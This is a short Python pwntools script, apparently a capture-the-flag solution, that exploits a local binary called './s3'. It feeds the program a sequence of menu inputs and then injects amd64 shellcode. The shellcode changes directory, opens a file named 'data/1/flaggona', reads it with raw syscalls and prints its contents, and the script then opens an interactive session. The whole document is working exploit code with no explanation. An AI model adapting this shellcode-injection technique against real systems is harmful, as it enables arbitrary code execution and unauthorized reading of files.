from pwn import *
conn=process("./s3")
expl = shellcraft.amd64.linux.chdir(".")
open_sh=shellcraft.amd64.linux.open("data/1/flaggona", 0)
read_sh="""mov rax, 0
mov rdi, 4
mov rsi, rsp
mov rdx, 256
syscall
mov rdx, 256
mov rdi, 1
mov rsi, rsp
mov rax, 1
syscall"""
payload=asm(expl+open_sh+read_sh, arch="amd64")
conn.sendline(b"1")
conn.sendline(b"0")
conn.sendline(b"ciaone")
conn.sendline(b"5")
#conn.sendline(payload)
#print(payload)
#gdb.attach(conn)
pause()
conn.sendline(payload)
conn.interactive()
